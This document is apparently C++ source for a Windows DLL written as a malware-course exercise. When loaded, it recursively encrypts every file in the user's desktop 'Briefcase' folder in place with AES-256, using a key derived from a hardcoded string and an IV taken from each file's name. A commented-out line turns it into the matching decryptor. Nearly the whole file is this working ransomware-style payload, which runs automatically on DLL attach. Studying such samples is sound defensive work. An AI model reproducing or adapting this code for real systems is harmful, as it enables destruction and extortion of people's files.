// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <tchar.h>
#include <stdio.h>
#include <Shlobj.h>
#include <Wincrypt.h>
#include <windows.h>
#include <iostream>
#include "atlstr.h"


/*-----------------------------------------------------------*/

using namespace std;

//function to concat two strings
void concatString(TCHAR* FullFolderName, TCHAR* path, TCHAR* folderName) {
    TCHAR str2[2] = { '\\', 0 };
    lstrcpyW(FullFolderName, path);
    lstrcatW(FullFolderName, str2);
    lstrcatW(FullFolderName, folderName);
    return;
}

//function to hash key_string, create a key for AES-256 cryptography
int SHA1Hasher(HCRYPTKEY* phKEY, HCRYPTPROV phProv, int alg_ID, BYTE* data, int dataLen) {
    HCRYPTHASH pbhash;

    if (CryptCreateHash(phProv, 0x8004, 0, 0, &pbhash)) {       //0x8004 - indicate SHA1 hash cryptography
        if (pbhash) {
            if (CryptHashData(pbhash, data, dataLen, 0)) {      //sha1(stringAsHashKey)
                int retValue = 0;
                if (CryptDeriveKey(phProv, alg_ID, pbhash, 1, phKEY))
                    retValue = 1;
                CryptDestroyHash(pbhash);
                return retValue;
            }
            else {
                CryptDestroyHash(pbhash);
                return 0;
            };
        }
        else return 0;
    }
    else return 0;
}

//free key and provider allocate memory if one of Cryptography fails
void destroyKey_Prov(HCRYPTKEY phKey, HCRYPTPROV phProv) {
    if (phKey)
        CryptDestroyKey(phKey);
    if (phProv)
        CryptReleaseContext(phProv, 0);
    return;
}

//AES-256 set-up
int aesCryptoStuff(HCRYPTKEY* phKey, HCRYPTPROV* phProv, BYTE* data, int dataLen) {
    BYTE pbData[] = { 1, 0, 0, 0 };
    if (CryptAcquireContextW(phProv, 0, 0, 0x18, 0) != 0) {
        if (SHA1Hasher(phKey, *phProv, 0x6610, data, dataLen)) {
            if (CryptSetKeyParam(*phKey, 4, pbData, 0)) {
                return 1;
            }
            else {
                destroyKey_Prov(*phKey, *phProv);
                return 0;
            }
        }
        else {
            if (*phProv) {
                CryptReleaseContext(*phProv, 0);
            }
            return 0;
        }
    }
    return 0;
}

//hash file name to create IV for AES-256 crypto
int MD5HashFileReadName(int hKey, int hProv, BYTE* hashDigest, BYTE* hashData, int lenHashData) {
    int retValue = 0;
    BYTE pbData[4];
    DWORD pdwDataLen;
    pdwDataLen = 4;
    HCRYPTHASH pbHash;
    DWORD pdwLenHashDigest;
    if (CryptGetKeyParam(*(DWORD*)hKey, 8, pbData, &pdwDataLen, 0)) {

        pbData[0] >>= 3;
        int len_digest = pbData[0];
        memset(hashDigest, 0, len_digest);
        if (CryptCreateHash(*(DWORD*)hProv, 0x8003, 0, 0, &pbHash)) {
            if (pbHash) {
                if (CryptHashData(pbHash, hashData, lenHashData, 0)) {
                    pdwLenHashDigest = 16;
                    if (CryptGetHashParam(pbHash, 2, hashDigest, &pdwLenHashDigest, 0)) {
                        if (CryptSetKeyParam(*(DWORD*)hKey, 1, hashDigest, 0)) {    //set hash(fileName)
                                                                                    //as new key for encrypt
                            CryptDestroyHash(pbHash);
                            retValue = 1;
                        }
                        else {
                            BYTE* tmp;
                            tmp = hashDigest;
                            delete(tmp);
                            destroyKey_Prov(*(DWORD*)hKey, *(DWORD*)hProv);
                            retValue = 0;
                        }
                    }
                    else {
                        retValue = 0;
                    }
                }
                else {
                    CryptDestroyHash(pbHash);
                    retValue = 0;
                }
            }
            else {

                retValue = 0;
            }
        }
        else retValue = 0;
    }
    else {
        destroyKey_Prov(*(DWORD*)hKey, *(DWORD*)hProv);
        retValue = 0;
    }
    return retValue;
}

//Encrypt file
int EncryptFunc(int hKey, int hProv, TCHAR* fullPath) {
    int result = 0;
    int check = 0;
    BYTE pbData[4];
    DWORD pdwDataLen = 4;
    DWORD nNumberOfBytesToRead;
    DWORD bufferSize;
    DWORD fileSize = 0;
    DWORD NumberOfBytesRead;
    HANDLE hFileRead = (HANDLE)-1;
    HANDLE hFileWrite = (HANDLE)-1;
    LPVOID lpBuffer = 0;        //buffer to read bytes from file

    if (CryptGetKeyParam(*(DWORD*)hKey, 8, pbData, &pdwDataLen, 0)) {
        pbData[0] >>= 3;
        nNumberOfBytesToRead = 0x4000 - 0x4000 % pbData[0];
        if (pbData[0] <= 1)
            bufferSize = nNumberOfBytesToRead;
        else
            bufferSize = nNumberOfBytesToRead + pbData[0];
        //0x80000000 --> dwdesiredAccess is GENERAL_READ
        //0x03(param 5th) --> open exist file
        hFileRead = CreateFileW(fullPath, 0x80000000, 0x3, 0, 0x3, 0x80, 0);
        if (hFileRead == (HANDLE)-1) {
            result = 0;
        }
        else {
            fileSize = GetFileSize(hFileRead, 0);
            if (fileSize) {
                hFileWrite = CreateFileW(fullPath, 0x40000004, 3, 0, 3, 0x80, 0);
                if (hFileWrite != (HANDLE)-1) {
                    HANDLE hBufferHeap = GetProcessHeap();
                    lpBuffer = HeapAlloc(hBufferHeap, 0, bufferSize + 1);
                    if (lpBuffer) {
                        int boolFinal = 0;
                        while (ReadFile(hFileRead, lpBuffer, nNumberOfBytesToRead, &NumberOfBytesRead, 0)) {
                            if (NumberOfBytesRead < nNumberOfBytesToRead)
                                boolFinal = 1;
                            int encRet, wriFileRet = 0;
                            //if you decrypt file, uncomment line below, and comment its following line
                            //encRet = CryptDecrypt(*(DWORD*)hKey, 0, boolFinal, 0, (BYTE*)lpBuffer, &NumberOfBytesRead);
                            
                            
                            //encrypt file
                            encRet = CryptEncrypt(*(DWORD*)hKey, 0, boolFinal, 0, (BYTE*)lpBuffer, &NumberOfBytesRead, bufferSize);
                            wriFileRet = WriteFile(hFileWrite, lpBuffer, NumberOfBytesRead, &NumberOfBytesRead, 0);
                            if (encRet == 0 || wriFileRet == 0)
                                break;
                            //bool FInal to indicate whether encrypt/decrypt to final data block 
                            if (boolFinal) {
                                check = boolFinal;
                                break;
                            }
                        }
                    }
                }
            }
            if (hFileRead)
                CloseHandle(hFileRead);
            if (hFileWrite)
                CloseHandle(hFileWrite);
            if (lpBuffer) {
                LPVOID tmp = lpBuffer;
                HANDLE hHeap = GetProcessHeap();
                HeapFree(hHeap, 0, tmp);
            }
            result = check;
        }   //else branch end!
    }
    else {
        destroyKey_Prov(*(DWORD*)hKey, *(DWORD*)hProv);
        result = 0;
    }
    return result;
}


/*iterate all files in C:\<user-name>\Desktop\Briefcase to encrypt or decrypt them*/
int encryptAllFile(int hKey, int hProv, TCHAR* folderPath) {
    TCHAR strTmp[3] = { '\\', '*', 0 };;

    int len_fileName = 0;

    TCHAR str1[1000];
    lstrcpyW(str1, folderPath);
    lstrcatW(str1, strTmp);
    struct _WIN32_FIND_DATAW FindFileData;


    //create handle to find files in the directory C:\<user name>\Desktop\Briefcase
    HANDLE hFindFile = FindFirstFileW(str1, &FindFileData);
    if (hFindFile == (HANDLE)-1)
        return 0;
    do {
        TCHAR fileName[260];
        TCHAR fullPath[1000];
        int isDirectory;
        lstrcpyW(fileName, FindFileData.cFileName);
        isDirectory = (int)(FindFileData.dwFileAttributes);
        if (isDirectory & 0x10 && fileName[0] != '.') {            //if it's a directory
            concatString(fullPath, folderPath, fileName);
            encryptAllFile(hKey, hProv, fullPath);
        }
        else {

            if ((isDirectory & 0x10) == 0) {                    //it's a file, encrypt or decrypt 

                concatString(fullPath, folderPath, fileName);
                len_fileName = lstrlenW(fileName);
                CharLowerW(fileName);
                BYTE byteArrayOfFileName[260];
                int i = 0;
                for (i; i < len_fileName; i++) {
                    byteArrayOfFileName[i] = fileName[i];
                }
                byteArrayOfFileName[i] = 0;
                BYTE* md5DigestOfFileName = new BYTE[16];
                if (MD5HashFileReadName(hKey, hProv, md5DigestOfFileName, byteArrayOfFileName, len_fileName)) {
                    if (!EncryptFunc(hKey, hProv, fullPath)) {

                        return 0;
                    }
                }
            }
        }

    } while (FindNextFileW(hFindFile, &FindFileData));
    return 1;
}


/*----------------------------------------------------------*/



DWORD WINAPI MainThread(LPVOID param) {
    TCHAR pszPath[MAX_PATH];
    int res = 0;
    if (SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, 0, 0, pszPath) == 0) {   //get desktop path
        if (lstrlenW(pszPath) <= 248) {
            TCHAR targetFolder[10] = L"Briefcase";
            LPWSTR fullFolderPath = new WCHAR[260];
            concatString(fullFolderPath, &pszPath[0], &targetFolder[0]);        //get full path of Briefcase

            //key, will be hashed SHA1 --> SHA1 digest --> CryptDeriveKey(SHA1-digest) --> key AES-256 
            std::string stringAsHashKey = "Malware_machenism_courses_is_so_funny";
            int len_keyHash = stringAsHashKey.length();
            HCRYPTKEY phKey;
            HCRYPTPROV phProv;
            BYTE* byteAsHashKey = new BYTE[len_keyHash];
            for (int i = 0; i < len_keyHash; i++) {
                byteAsHashKey[i] = stringAsHashKey[i];
            }
            //AES set up 
            int cryptStuff = aesCryptoStuff(&phKey, &phProv, &byteAsHashKey[0], 37);
            if (cryptStuff) {
                if (encryptAllFile((int)&phKey, (int)&phProv, fullFolderPath)) {
                    MessageBox(0, L"Encrypted or Decrypted all files in C:\<user name>\Desktop\Briefcase successfully", L"From DLL: Success", 0);
                    return 1;
                }
            }
            else
            {
                MessageBox(0, L"Couldn't do hacking, so sad :(", L"From DLL: Fail", 0);
                return 0;
            }

        }
        else {
            MessageBox(0, L"Path length was too long", L"Error: PathLength", 0);
            return 0;
        }
    }
    else {
        MessageBox(0, L"Can't get desktop directory path", L"Error: GetPath", 0);
        return 0;
    }
}



BOOL WINAPI DllMain(HINSTANCE hInstDll, DWORD fdwReason, PVOID fImpLoad) {
	if (fdwReason == DLL_PROCESS_ATTACH) {
		MessageBox(0, L"Hello I'm from DLL", L"From DLL", 0);
		CreateThread(0, 0, MainThread, hInstDll, 0, 0);
	}
	return(TRUE);
}